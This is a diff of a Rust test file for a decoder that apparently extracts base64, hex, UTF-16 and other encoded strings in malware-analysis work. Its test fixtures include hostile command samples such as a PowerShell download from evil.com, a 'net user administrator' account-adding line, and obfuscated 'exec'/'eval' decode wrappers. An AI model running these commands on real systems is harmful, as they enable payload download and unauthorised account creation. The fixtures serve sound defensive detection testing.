@@ -4,7 +4,7 @@ use super::*;
 use std::sync::atomic::AtomicUsize;
 
 #[test]
-fn test_base64_decode() {
+fn decodes_base64() {
     let input = ExtractedString {
         value: "SGVsbG8gV29ybGQh".to_string(), // "Hello World!"
         data_offset: 0,
@@ -19,7 +19,7 @@ fn test_base64_decode() {
 }
 
 #[test]
-fn test_base64_decode_short_commands() {
+fn decodes_short_base64_commands() {
     // The dropper primitives hidden in `base64 -d <<< …` one-liners are
     // short: `/bin/rm` and `uname -a` each encode to just 12 base64 chars.
     // They must decode — the 12-char floor exists precisely for these.
@@ -42,7 +42,7 @@ fn utf16le(s: &str) -> Vec<u8> {
 }
 
 #[test]
-fn test_decode_utf16le_ascii() {
+fn decodes_utf16le_ascii() {
     assert_eq!(
         decode_utf16le(&utf16le("whoami /all")).as_deref(),
         Some("whoami /all")
@@ -50,26 +50,26 @@ fn test_decode_utf16le_ascii() {
 }
 
 #[test]
-fn test_decode_utf16le_strips_bom() {
+fn utf16le_strips_bom() {
     let mut bytes = vec![0xFF, 0xFE]; // UTF-16LE BOM
     bytes.extend(utf16le("Get-Process"));
     assert_eq!(decode_utf16le(&bytes).as_deref(), Some("Get-Process"));
 }
 
 #[test]
-fn test_decode_utf16le_rejects_binary() {
+fn utf16le_rejects_binary() {
     // Arbitrary binary should not be coerced into wide text.
     let binary = [0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00];
     assert_eq!(decode_utf16le(&binary), None);
 }
 
 #[test]
-fn test_decode_utf16le_rejects_odd_length() {
+fn utf16le_rejects_odd_length() {
     assert_eq!(decode_utf16le(&[0x48, 0x00, 0x65]), None);
 }
 
 #[test]
-fn test_base64_decode_utf16le() {
+fn decodes_base64_over_utf16le() {
     // The canonical Windows form: base64 over little-endian UTF-16, like the
     // payload of `powershell -EncodedCommand`, embedded in any filetype.
     let wide = utf16le("Invoke-WebRequest http://evil.com/x.exe");
@@ -84,7 +84,7 @@ fn test_base64_decode_utf16le() {
 }
 
 #[test]
-fn test_decode_base64_strings_utf16le_batch() {
+fn batch_decodes_base64_over_utf16le() {
     let wide = utf16le("net user administrator P@ssw0rd /add");
     let b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &wide);
     let results = decode_base64_strings(&[make_string(&b64, Some(StringKind::Base64))]);
@@ -93,7 +93,7 @@ fn test_decode_base64_strings_utf16le_batch() {
 }
 
 #[test]
-fn test_hex_decode() {
+fn decodes_hex() {
     let input = ExtractedString {
         value: "48656c6c6f20576f726c6421".to_string(), // "Hello World!"
         data_offset: 0,
@@ -102,7 +102,7 @@ fn test_hex_decode() {
         ..Default::default()
     };
 
-    let result = decode_hex_variants(&input)
+    let result = decode_hex_variants(&input, true)
         .into_iter()
         .find(|decoded| decoded.method == StringMethod::HexDecode)
         .unwrap();
@@ -111,7 +111,7 @@ fn test_hex_decode() {
 }
 
 #[test]
-fn test_url_decode() {
+fn decodes_url_escapes() {
     let input = ExtractedString {
         value: "Hello%20World%21%20%2B%20More".to_string(), // "Hello World! + More"
         data_offset: 0,
@@ -126,7 +126,7 @@ fn test_url_decode() {
 }
 
 #[test]
-fn test_url_with_normal_encoding_not_decoded_as_payload() {
+fn skips_urls_with_only_reserved_escapes() {
     // A real URL whose percent-encoding only covers reserved chars (`:`,
     // space) is normal URL syntax, not an encoded payload — even when the
     // extracted string carries source context (`x = "..."`) and is therefore
@@ -151,7 +151,7 @@ fn test_url_with_normal_encoding_not_decoded_as_payload() {
 }
 
 #[test]
-fn test_unicode_escape_decode() {
+fn decodes_hex_escapes() {
     let input = ExtractedString {
         value: "\\x48\\x65\\x6c\\x6c\\x6f".to_string(), // "Hello"
         data_offset: 0,
@@ -192,21 +192,22 @@ fn unicode_escape_decodes_through_redundant_backslash() {
 }
 
 #[test]
-fn test_is_likely_base64() {
+fn recognizes_likely_base64() {
     assert!(is_likely_base64("SGVsbG8gV29ybGQhCg=="));
     assert!(!is_likely_base64("not base64!"));
     assert!(!is_likely_base64("short"));
 }
 
 #[test]
-fn test_is_likely_hex() {
-    assert!(is_likely_hex("48656c6c6f20576f726c6421"));
-    assert!(!is_likely_hex("not hex!"));
-    assert!(!is_likely_hex("48656c6c6f2")); // odd length
+fn decodes_unlabelled_hex_and_skips_odd_length_or_non_hex() {
+    let decoded = |value: &str| !decode_hex_strings(&[make_string(value, None)]).is_empty();
+    assert!(decoded("48656c6c6f20576f726c6421"));
+    assert!(!decoded("not hex! not hex! not hex!"));
+    assert!(!decoded("48656c6c6f20576f726c642")); // odd length
 }
 
 #[test]
-fn test_base32_decode() {
+fn decodes_padded_base32() {
     let input = ExtractedString {
         value: "JBSWY3DPEBLW64TMMQ======".to_string(), // "Hello World"
         data_offset: 0,
@@ -221,7 +222,7 @@ fn test_base32_decode() {
 }
 
 #[test]
-fn test_base32_decode_nopad() {
+fn decodes_unpadded_base32() {
     let input = ExtractedString {
         value: "JBSWY3DPEBLW64TMMQ".to_string(), // "Hello World" without padding
         data_offset: 0,
@@ -236,7 +237,7 @@ fn test_base32_decode_nopad() {
 }
 
 #[test]
-fn test_base32_decode_long() {
+fn decodes_long_base32() {
     // Test with actual long base32 strings from real use
     let input = ExtractedString {
         value: "KRUGS4ZANFZSAYJAONSWG4TFOQQG2ZLTONQWOZJAMZXXEIDUMVZXI2LOM4======".to_string(),
@@ -252,7 +253,7 @@ fn test_base32_decode_long() {
 }
 
 #[test]
-fn test_base85_decode() {
+fn decodes_ascii85() {
     // Test with a simple known base85 string
     // We'll test the raw decoder function directly
     let decoded = decode_ascii85("9jqo^").unwrap();
@@ -261,14 +262,14 @@ fn test_base85_decode() {
 }
 
 #[test]
-fn test_ascii85_decode_with_z() {
+fn ascii85_expands_z_to_zero_word() {
     // Test 'z' shorthand for four zero bytes
     let decoded = decode_ascii85("z").unwrap();
     assert_eq!(decoded, vec![0u8; 4]);
 }
 
 #[test]
-fn test_ascii85_decode_with_delimiters() {
+fn ascii85_skips_delimiters() {
     // Test that delimiters are properly skipped
     assert_eq!(decode_ascii85("<!!!!"), Some(vec![0x54, 0x01, 0xfe, 0xab]));
     assert_eq!(
@@ -281,7 +282,7 @@ fn test_ascii85_decode_with_delimiters() {
 }
 
 #[test]
-fn test_is_likely_base32() {
+fn recognizes_likely_base32() {
     assert!(is_likely_base32("JBSWY3DPEBLW64TMMQ======"));
     assert!(is_likely_base32("MFRGG3DFMZTWQ2LK"));
     assert!(!is_likely_base32("not base32!"));
@@ -290,7 +291,7 @@ fn test_is_likely_base32() {
 }
 
 #[test]
-fn test_is_likely_base85() {
+fn rejects_plain_text_as_base85() {
     // Plain text should not be detected as base85 (even if it has valid chars)
     assert!(!is_likely_base85("not base85!"));
     assert!(!is_likely_base85("short"));
@@ -314,7 +315,7 @@ fn make_string(value: &str, kind: Option<StringKind>) -> ExtractedString {
 }
 
 #[test]
-fn test_deobfuscate_concatenation_javascript() {
+fn joins_javascript_concatenation() {
     let input = r#""SGVsbG8g" + "V29ybGQhCg==""#;
     assert_eq!(
         deobfuscate_concatenation(input),
@@ -323,7 +324,7 @@ fn test_deobfuscate_concatenation_javascript() {
 }
 
 #[test]
-fn test_deobfuscate_concatenation_python() {
+fn joins_python_concatenation() {
     let input = r#"'SGVsbG8g' + 'V29ybGQhCg==""#;
     assert_eq!(
         deobfuscate_concatenation(input),
@@ -332,7 +333,7 @@ fn test_deobfuscate_concatenation_python() {
 }
 
 #[test]
-fn test_deobfuscate_concatenation_php() {
+fn joins_php_concatenation() {
     let input = r#"'SGVsbG8g' . 'V29ybGQhCg==""#;
     assert_eq!(
         deobfuscate_concatenation(input),
@@ -341,17 +342,17 @@ fn test_deobfuscate_concatenation_php() {
 }
 
 #[test]
-fn test_deobfuscate_concatenation_no_pattern() {
+fn concatenation_ignores_plain_string() {
     assert_eq!(deobfuscate_concatenation("simple_string_no_concat"), None);
 }
 
 #[test]
-fn test_deobfuscate_concatenation_too_short() {
+fn concatenation_rejects_short_result() {
     assert_eq!(deobfuscate_concatenation(r#""ab" + "cd""#), None);
 }
 
 #[test]
-fn test_decode_base64_strings_batch() {
+fn batch_decodes_base64_and_skips_non_base64() {
     let inputs = vec![
         make_string("SGVsbG8gV29ybGQh", Some(StringKind::Base64)),
         make_string("VGVzdCBEYXRhISE=", Some(StringKind::Base64)),
@@ -365,7 +366,7 @@ fn test_decode_base64_strings_batch() {
 }
 
 #[test]
-fn test_decode_base64_strings_with_concatenation() {
+fn decodes_concatenated_base64() {
     let inputs = vec![make_string(r#""SGVsbG8g" + "V29ybGQh""#, None)];
     let results = decode_base64_strings(&inputs);
     assert_eq!(results.len(), 1);
@@ -374,17 +375,17 @@ fn test_decode_base64_strings_with_concatenation() {
 }
 
 #[test]
-fn test_decode_base64_empty() {
+fn empty_base64_batch_yields_nothing() {
     assert!(decode_base64_strings(&[]).is_empty());
 }
 
 #[test]
-fn test_base64_too_short() {
+fn rejects_short_base64() {
     assert!(decode_base64_strings(&[make_string("SGVs", Some(StringKind::Base64))]).is_empty());
 }
 
 #[test]
-fn test_base64_whitespace_trimming() {
+fn trims_whitespace_around_base64() {
     let results = decode_base64_strings(&[make_string(
         "  SGVsbG8gV29ybGQh  ",
         Some(StringKind::Base64),
@@ -394,7 +395,7 @@ fn test_base64_whitespace_trimming() {
 }
 
 #[test]
-fn test_decode_hex_strings_batch() {
+fn batch_decodes_hex_and_skips_non_hex() {
     let inputs = vec![
         make_string("48656c6c6f20576f726c6421", Some(StringKind::HexEncoded)),
         make_string("54657374204461746121", Some(StringKind::HexEncoded)),
@@ -413,14 +414,14 @@ fn test_decode_hex_strings_batch() {
 }
 
 #[test]
-fn test_hex_xor_scan_respects_auto_detect_size_limit() {
+fn skips_xor_scan_of_oversized_hex() {
     let key = 0x42;
     let mut decoded = vec![0x01 ^ key; crate::xor::MAX_AUTO_DETECT_SIZE + 1];
     for (index, byte) in b"http://example.test".iter().enumerate() {
         decoded[index] = byte ^ key;
     }
     let encoded = crate::bytes::to_hex(&decoded);
-    let results = decode_hex_variants(&make_string(&encoded, Some(StringKind::HexEncoded)));
+    let results = decode_hex_strings(&[make_string(&encoded, Some(StringKind::HexEncoded))]);
     assert!(
         results
             .iter()
@@ -430,7 +431,7 @@ fn test_hex_xor_scan_respects_auto_detect_size_limit() {
 }
 
 #[test]
-fn test_hex_odd_length() {
+fn rejects_odd_length_hex() {
     assert!(
         decode_hex_strings(&[make_string(
             "48656c6c6f20576f726c642",
@@ -441,7 +442,7 @@ fn test_hex_odd_length() {
 }
 
 #[test]
-fn test_hex_uppercase() {
+fn decodes_uppercase_hex() {
     let results = decode_hex_strings(&[make_string(
         "48656C6C6F20576F726C6421",
         Some(StringKind::HexEncoded),
@@ -451,7 +452,7 @@ fn test_hex_uppercase() {
 }
 
 #[test]
-fn test_decode_url_strings_batch() {
+fn batch_decodes_url_escapes() {
     let inputs = vec![
         make_string("Hello%20World%21", Some(StringKind::UrlEncoded)),
         make_string("Test%20Data%21%21", Some(StringKind::UrlEncoded)),
@@ -465,7 +466,7 @@ fn test_decode_url_strings_batch() {
 }
 
 #[test]
-fn test_url_special_chars() {
+fn decodes_url_reserved_chars() {
     let results = decode_url_strings(&[make_string(
         "path%2Fto%2Ffile%3Fquery%3Dvalue%26foo%3Dbar",
         Some(StringKind::UrlEncoded),
@@ -475,7 +476,7 @@ fn test_url_special_chars() {
 }
 
 #[test]
-fn test_decode_unicode_escape_strings_batch() {
+fn batch_decodes_hex_and_unicode_escapes() {
     let inputs = vec![
         make_string(
             "\\x48\\x65\\x6c\\x6c\\x6f",
@@ -495,7 +496,7 @@ fn test_decode_unicode_escape_strings_batch() {
 }
 
 #[test]
-fn test_decode_base32_strings_batch() {
+fn batch_decodes_base32() {
     let inputs = vec![
         make_string("JBSWY3DPEBLW64TMMQ======", Some(StringKind::Base32)),
         make_string("not_base32", None),
@@ -507,48 +508,49 @@ fn test_decode_base32_strings_batch() {
 }
 
 #[test]
-fn test_base32_too_short() {
+fn rejects_short_base32() {
     assert!(decode_base32_strings(&[make_string("JBSWY3DP", Some(StringKind::Base32))]).is_empty());
 }
 
 #[test]
-fn test_base85_with_whitespace() {
-    if let Some(decoded) = decode_ascii85("<~9jqo^\n  \t~>") {
-        assert_eq!(decoded, b"Man ");
-    }
+fn ascii85_skips_whitespace() {
+    assert_eq!(
+        decode_ascii85("<~9jqo^\n  \t~>").as_deref(),
+        Some(&b"Man "[..])
+    );
 }
 
 #[test]
-fn test_base85_z_shorthand() {
-    if let Some(decoded) = decode_ascii85("z") {
-        assert_eq!(decoded, vec![0u8; 4]);
-    }
+fn ascii85_decodes_lone_z() {
+    assert_eq!(decode_ascii85("z").as_deref(), Some(&[0u8; 4][..]));
 }
 
 #[test]
-fn test_base85_invalid_char() {
+fn ascii85_rejects_invalid_char() {
     assert!(decode_ascii85("9jqo^~invalid~").is_none());
 }
 
 #[test]
-fn test_base85_overflow_protection() {
+fn ascii85_rejects_overflowing_group() {
     assert!(decode_ascii85("uuuuu").is_none());
 }
 
 #[test]
-fn test_decoded_ip_classification() {
+fn classifies_hex_decoded_ip() {
     let results = decode_hex_strings(&[make_string(
         "3139322e3136382e312e31",
         Some(StringKind::HexEncoded),
     )]);
-    if !results.is_empty() {
-        assert_eq!(results[0].value, "192.168.1.1");
-        assert_eq!(results[0].kind, Some(StringKind::Ip));
-    }
+    let [ip] = results.as_slice() else {
+        panic!("expected one decoded string, got {results:?}");
+    };
+    assert_eq!(ip.value, "192.168.1.1");
+    assert_eq!(ip.method, StringMethod::HexDecode);
+    assert_eq!(ip.kind, Some(StringKind::Ip));
 }
 
 #[test]
-fn test_base64_reject_identifier_false_positives() {
+fn rejects_dotnet_identifiers_as_base64() {
     // These are .NET interface/class names that look like base64 but decode to garbage
     // The input (readable identifier) should be considered higher quality than
     // the decoded output (binary garbage)
@@ -575,7 +577,7 @@ fn test_base64_reject_identifier_false_positives() {
 // Tests for extract_embedded_base64
 
 #[test]
-fn test_extract_embedded_base64_python_style() {
+fn extracts_base64_from_python_b64decode() {
     // Python: exec(base64.b64decode('SGVsbG8gV29ybGQh'))
     let input = make_string("exec(base64.b64decode('SGVsbG8gV29ybGQh'))", None);
     let results = extract_embedded_base64(&[input]);
@@ -585,7 +587,7 @@ fn test_extract_embedded_base64_python_style() {
 }
 
 #[test]
-fn test_extract_embedded_base64_shell_style() {
+fn extracts_base64_from_shell_pipe() {
     // Shell: echo SGVsbG8gV29ybGQh | base64 -d
     let input = make_string(
         "echo SGVsbG8gV29ybGQh | base64 -d",
@@ -597,7 +599,7 @@ fn test_extract_embedded_base64_shell_style() {
 }
 
 #[test]
-fn test_extract_embedded_base64_short_decode_command() {
+fn extracts_short_base64_behind_decode_command() {
     // gentoo-systemd's obfuscated `configure` and kin: a short base64 hidden
     // behind `base64 -d`/`--decode`/`-D`. Too short for the general floor,
     // but the command vouches for it — including the *unpadded* `reboot`,
@@ -619,7 +621,7 @@ fn test_extract_embedded_base64_short_decode_command() {
 }
 
 #[test]
-fn test_extract_embedded_base64_padded_short_run() {
+fn extracts_padded_short_base64() {
     // Padding is base64's own tell and almost never follows an identifier,
     // so a padded short run decodes on that signal alone — no command
     // needed. Both are too short (10–11 alnum) for the old fixed floor.
@@ -637,7 +639,7 @@ fn test_extract_embedded_base64_padded_short_run() {
 }
 
 #[test]
-fn test_extract_embedded_base64_unpadded_short_needs_a_signal() {
+fn ignores_bare_unpadded_short_base64() {
     // `reboot` → `cmVib290` is 8 alnum with no padding: no signal on its
     // own, so a bare occurrence is ignored. This is what keeps the lower
     // floor from turning ordinary 8-char tokens into noise.
@@ -649,7 +651,7 @@ fn test_extract_embedded_base64_unpadded_short_needs_a_signal() {
 }
 
 #[test]
-fn test_extract_embedded_base64_javascript_atob() {
+fn extracts_base64_from_atob() {
     // JavaScript: eval(atob('SGVsbG8gV29ybGQh'))
     let input = make_string("eval(atob('SGVsbG8gV29ybGQh'))", None);
     let results = extract_embedded_base64(&[input]);
@@ -658,7 +660,7 @@ fn test_extract_embedded_base64_javascript_atob() {
 }
 
 #[test]
-fn test_extract_embedded_base64_skips_whole_string() {
+fn embedded_scan_skips_whole_string_base64() {
     // If the entire string is base64, it should be skipped (handled by decode_base64_strings)
     let input = make_string("SGVsbG8gV29ybGQh", Some(StringKind::Base64));
     let results = extract_embedded_base64(&[input]);
@@ -669,7 +671,7 @@ fn test_extract_embedded_base64_skips_whole_string() {
 }
 
 #[test]
-fn test_extract_embedded_base64_requires_valid_length() {
+fn embedded_scan_rejects_impossible_length() {
     // Even without padding, a remainder of one is impossible.
     let input = make_string("decode('SGVsbG9Xb3JsZ')", None); // 13 characters
     let results = extract_embedded_base64(&[input]);
@@ -723,7 +725,7 @@ fn base64_optional_padding_rejects_malformed_encodings() {
 }
 
 #[test]
-fn test_extract_embedded_base64_multiple_in_one_string() {
+fn extracts_multiple_embedded_base64() {
     // Multiple base64 strings in one line (must be >= 12 chars each to match regex)
     // "Hello World!" = SGVsbG8gV29ybGQh (16 chars)
     // "Test String!" = VGVzdCBTdHJpbmch (16 chars)
@@ -737,7 +739,7 @@ fn test_extract_embedded_base64_multiple_in_one_string() {
 }
 
 #[test]
-fn test_extract_embedded_base64_nested_code() {
+fn extracts_embedded_base64_python_code() {
     // Nested Python code - common in malware
     // Inner: "import os; os.system('whoami')"
     let inner_b64 = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3dob2FtaScp";
@@ -749,7 +751,7 @@ fn test_extract_embedded_base64_nested_code() {
 }
 
 #[test]
-fn test_extract_embedded_base64_rejects_short_decoded() {
+fn embedded_scan_rejects_short_decoded() {
     // Even if base64 is valid, decoded result must be >= 4 chars
     let input = make_string("decode('YWI=')", None); // decodes to "ab" (2 chars)
     let results = extract_embedded_base64(&[input]);
@@ -760,7 +762,7 @@ fn test_extract_embedded_base64_rejects_short_decoded() {
 }
 
 #[test]
-fn test_extract_embedded_base64_locates_the_token() {
+fn embedded_base64_offset_points_at_token() {
     let value = "exec(base64.b64decode('SGVsbG8gV29ybGQh'))";
     let token = "SGVsbG8gV29ybGQh";
     let token_pos = value.find(token).unwrap() as u64;
@@ -799,4 +801,36 @@ fn encoded_document_with_embedded_literal_url_is_still_decoded() {
     );
     assert!(decoded.value.contains("<input type=\"password\">"));
     assert_eq!(decoded.method, StringMethod::UrlDecode);
+}
+
+#[test]
+fn printf_directives_are_not_url_escapes() {
+    for value in [
+        "%s - %02d:%02d:%02d %d%s",
+        "0x%02hx%02hx%02hx",
+        "HTTP/%1d.%1d%c=",
+    ] {
+        assert!(
+            decode_url_strings(&[make_string(value, None)]).is_empty(),
+            "{value}"
+        );
+    }
+    let real = decode_url_strings(&[make_string("%68%74%74%70%3a%2f%2fx.example%2fa", None)]);
+    assert_eq!(
+        real.first().map(|s| s.value.as_str()),
+        Some("http://x.example/a")
+    );
+}
+
+#[test]
+fn long_decimal_constants_do_not_hex_decode_to_controls() {
+    let digits = make_string(
+        "11102230246251565404236316680908203125",
+        Some(StringKind::HexEncoded),
+    );
+    assert!(
+        decode_hex_strings(&[digits])
+            .iter()
+            .all(|s| !s.value.chars().any(char::is_control)),
+    );
 }
